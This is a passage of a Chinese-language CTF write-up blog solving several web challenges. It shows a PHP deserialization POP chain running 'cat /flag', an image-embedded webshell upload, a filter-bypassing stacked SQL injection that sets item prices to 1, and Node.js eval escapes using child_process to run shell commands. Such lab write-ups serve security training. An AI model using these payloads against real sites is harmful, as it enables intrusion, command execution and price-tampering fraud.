Let<span class="hljs-string">'s do some deserialization :)</span></code></pre>
<p>这道题，链子简单，就是绕过wakeup就行了，也是老办法，链子如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NSS</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$whoami</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">"SWPU"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">"NSS"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$notes</span>;
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">F</span>();
<span class="hljs-variable">$pop</span>-&gt;notes = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">T</span>();
<span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();
<span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth-&gt;whoami = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NSS</span>();
<span class="hljs-variable">$pop</span>-&gt;notes-&gt;sth-&gt;whoami-&gt;cmd = <span class="hljs-string">"cat /flag"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>).<span class="hljs-string">"\n"</span>;
<span class="hljs-variable">$pop1</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'"F":3'</span>,<span class="hljs-string">'"F":4'</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$pop1</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>修改属性数量即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313183346732.png" alt="image-20240313183346732"></p>
<h1 id="swpuctf-2023-秋季新生赛ez_talk">[SWPUCTF 2023 秋季新生赛]ez_talk</h1>
<p>这里首先直接上传了php文件，结果在修改mime，后缀，文件头，都不行。且给的提示始终如一，所以我上传了正常的文件，之后发现根本不检测后缀。</p>
<p>于是尝试在正常图片加载php一句话木马，但依旧被ban，原因如下图使用了getimagesize函数来检测文件内容。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184641627.png" alt="image-20240313184641627"></p>
<p>因此直接上传图片马，然后bp抓包修改后缀，访问对应文件；如下图，仔细观察就知道，上传目录他反转了而已，正常访问即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184836860.png" alt="image-20240313184836860"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184906275.png" alt="image-20240313184906275"></p>
<h1 id="swpuctf-2023-秋季新生赛nss大卖场">[SWPUCTF 2023 秋季新生赛]NSS大卖场</h1>
<p>这也是第一次遇见update注入，脑子里根本没有这种想法，也是看了wp才自我认为想通了</p>
<p>首先是对页面常规测试了一番，也没什么信息，除了一个明显的hint，flag买不起。</p>
<p>虽然看了题目标签写着update注入，但是我虽然找到了注入点，但不知道如何下手，算是增长经验了。</p>
<p>首先看hint，给了一个数据库备份文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313192109988.png" alt="image-20240313192109988"></p>
<p>这里当时分析的时候，也没有分析出什么，看了wp才知道自己是没有分析的思路（就是不会分析）。</p>
<p>现在回过头来可以看到，这里面含有items表，而其中含有各种列名，但值得注意的就是price价格表，这也似乎成了后面为何想到update注入的关键了。</p>
<p>这里会想到通过update来更改items的price为1，这样就买的起了，接下来就是找注入点了，可以想到买商品的地方很可能存在注入点。这里尝试了一番，直接在url后面加了个单引号，于是爆出sql错误，接着进行恶意语句的写入，发现过滤了如下关键字</p>
<pre><code class="hljs scss">SELECT|select|UPDATE|update|WHERE|where| |or|AND|and|<span class="hljs-attribute">ORDER</span>|<span class="hljs-attribute">order</span>|BY|by|--|&lt;|&gt;|!</code></pre>
<p>但很明显可以大小写绕过，payload如下，这里不知道为何内联注释符不能代替空格</p>
<pre><code class="hljs scss">buy/<span class="hljs-number">1</span>';Update%<span class="hljs-number">09</span>items%<span class="hljs-number">09s</span>et%<span class="hljs-number">09</span>price=<span class="hljs-number">1</span>;#<span class="hljs-comment">//设置items的price字段全为1</span></code></pre>
<pre><code class="hljs scss">更新某一列
UPDATE <span class="hljs-selector-tag">table</span> SET column=new_value WHERE column= value

更新若干列
UPDATE <span class="hljs-selector-tag">table</span> SET column1=new_value1, column2=new_value2 WHEREcolumn= value</code></pre>
<p>之后直接买flag，查看即可</p>
<h1 id="gfctf-2021ez_calc">[GFCTF 2021]ez_calc</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194521226.png" alt="image-20240313194521226"></p>
<p>首先是一个登录框，这里看F12得到提示，采用nodejs处理，如果我们输入的用户名转换成小写不等于admin且转换为大写等于ADMIN且用户名等于admin123即可登录，这里翻了翻笔记，发现这样的特性</p>
<pre><code class="hljs scss"><span class="hljs-built_in">toUpperCase</span>()是javascript中将小写转换成大写的函数。
<span class="hljs-built_in">toLowerCase</span>()是javascript中将大写转换成小写的函数
除此之外
在Character<span class="hljs-selector-class">.toUpperCase</span>()函数中，字符ı会转变为<span class="hljs-selector-tag">I</span>，字符ſ会变为S。
在Character<span class="hljs-selector-class">.toLowerCase</span>()函数中，字符İ会转变为<span class="hljs-selector-tag">i</span>，字符K会转变为k。</code></pre>
<p>很显然，这里采用特殊字符即可。登陆之后发现是个计算器</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194708793.png" alt="image-20240313194708793"></p>
<pre><code class="hljs scss">&lt;!--
let calc = req<span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.calc</span>;
let flag = false;
<span class="hljs-comment">//waf</span>
for (let i = <span class="hljs-number">0</span>; i &lt; calc.length; i++) {
    if (flag || "/(flc'\".".split``.some(v =&gt; v == calc[i])) {
        <span class="hljs-comment">//禁用(,'f','l','c',"'",'"','.' 这些字符</span>
        flag = true;
        calc = calc<span class="hljs-selector-class">.slice</span>(<span class="hljs-number">0</span>, i) + "*" + calc<span class="hljs-selector-class">.slice</span>(i + <span class="hljs-number">1</span>, calc.length);
    }
}
<span class="hljs-comment">//截取</span>
calc = calc<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>);
<span class="hljs-comment">//去空</span>
calc = calc<span class="hljs-selector-class">.replace</span>(/\s+/g, "");

calc = calc<span class="hljs-selector-class">.replace</span>(/\\/g, "\\\\");<span class="hljs-comment">//将反斜杠替换为两个反斜杠</span>

<span class="hljs-comment">//小明的同学过滤了一些比较危险的东西</span>
while (calc.indexOf("sh") &gt; -<span class="hljs-number">1</span>) {
    calc = calc<span class="hljs-selector-class">.replace</span>("sh", "");
}
while (calc.indexOf("ln") &gt; -<span class="hljs-number">1</span>) {
    calc = calc<span class="hljs-selector-class">.replace</span>("ln", "");
}
while (calc.indexOf("fs") &gt; -<span class="hljs-number">1</span>) {
    calc = calc<span class="hljs-selector-class">.replace</span>("fs", "");
}
while (calc.indexOf("x") &gt; -<span class="hljs-number">1</span>) {
    calc = calc<span class="hljs-selector-class">.replace</span>("x", "");
}

try {
    result = <span class="hljs-built_in">eval</span>(calc);

}
--&gt;</code></pre>
<p>这里主要就是绕过第一个if条件语句的限制，首先他会检查传入的calc字符串的每一位字符是否为黑名单中的字符，如果是的话则过滤掉。这里限制的很死，我也是第一次遇见，只能看wp了，发现利用的是数组绕过。</p>
<p>原理是，如果我们传入如下内容：<code>["aaaaa","bbbbb",ccccc]</code>，那么该长度就是3了，而不是字符串的长度了。</p>
<p>这里似乎他在检查的时候，就只会把第一个元素当做整体了，即使其中包含黑名单字符，也不会进行过滤了，也就是这样的：<code>["a)aaa","bbbbb","(",]</code>在经过过滤之后会变成<code>a)a********</code>，因为他是在第三个为发现了敏感字符。于是按照逻辑，会将第三位以后得内容都进行替换。这样我们第一个元素的敏感字符就逃逸了。</p>
<p>详细解释可以参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/2020/03/19/%E4%B8%80%E9%81%93node-js%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E5%AE%9E%E7%8E%B0sql%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98%E7%9B%AE%E5%88%86/#undefined">一道Node.js类型混淆污染与字符逃逸实现SQL注入的题目分析</a></p>
<p>至于为什么一定要在最后搞一个敏感字符，那是因为如果都是正常的话，程序就会报错，但如果含有敏感字符，那前面的payload就可以执行</p>
<p>这样的话，可以按照逻辑进行如下构造：我们想要构造payload有多长，后面的数组就需要多少</p>
<pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-built_in">require</span>("child_process")<span class="hljs-selector-class">.spawnSync</span>('ls',['/'])<span class="hljs-selector-class">.stdout</span><span class="hljs-selector-class">.toString</span>();&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.</code></pre>
<p>这里不加<code>stdout.toString()</code>就没回显</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211135632.png" alt="image-20240313211135632"></p>
<p>接下来就是读取了，因为flag的名字很长，会超过长度限制，因此这里又需要对代码的理解了（GFCTF_is_girlfriend_ctf.flag）</p>
<p>这里过滤了x，也无法直接利用<code>exec</code>，但是实际上这里是可以绕过的，因为我们通过<code>require</code>导入的模块是一个<code>Object</code>，那么就可以通过<code>Object.values</code>获取到<code>child_process</code>里面的各种方法，那么再通过数组下标<code>[5]</code>就可以得到<code>execSync</code>了，那么有了<code>execSync</code>后就可以通过写入文件的方式读取flag了，<code>payload</code>如下:</p>
<pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.values</span>(require('child_process'))<span class="hljs-selector-attr">[5]</span>('cat${IFS}/G*&gt;p')&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=.</code></pre>
<p>执行之后直接读取p试试。</p>
<pre><code class="hljs scss">calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-built_in">require</span>('child_process')<span class="hljs-selector-class">.spawnSync</span>('nl',['p'])<span class="hljs-selector-class">.stdout</span><span class="hljs-selector-class">.toString</span>();&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;calc<span 